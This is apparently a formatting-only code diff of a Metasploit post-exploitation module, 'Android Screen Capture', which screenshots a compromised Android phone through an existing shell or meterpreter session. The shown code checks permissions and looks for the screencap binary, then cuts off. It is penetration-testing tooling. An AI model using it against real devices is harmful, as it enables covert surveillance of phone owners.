@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,38 +8,37 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Android Screen Capture',
-        'Description'   => %q{
-          This module takes a screenshot of the target phone.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'timwr' ],
-        'Platform'      => [ 'android' ],
-        'SessionTypes'  => [ 'shell', 'meterpreter' ]
-      ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Android Screen Capture',
+                      'Description'   => %q(
+                        This module takes a screenshot of the target phone.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'timwr' ],
+                      'Platform'      => [ 'android' ],
+                      'SessionTypes'  => [ 'shell', 'meterpreter' ]))
 
     register_options(
       [
         OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/data/local/tmp/']),
         OptString.new('EXE_PATH', [true, 'Path to remote screencap executable', '/system/bin/screencap'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
     id = cmd_exec('id')
-    unless id =~ /root/ or id =~ /shell/
+    unless id =~ /root/ || id =~ /shell/
       print_error("This module requires shell or root permissions")
       return
     end
 
     exe_path = datastore['EXE_PATH']
     tmp_path = datastore['TMP_PATH']
-    if not file?(exe_path)
+    unless file?(exe_path)
       print_error("Aborting, screencap binary not found.")
       return
     end
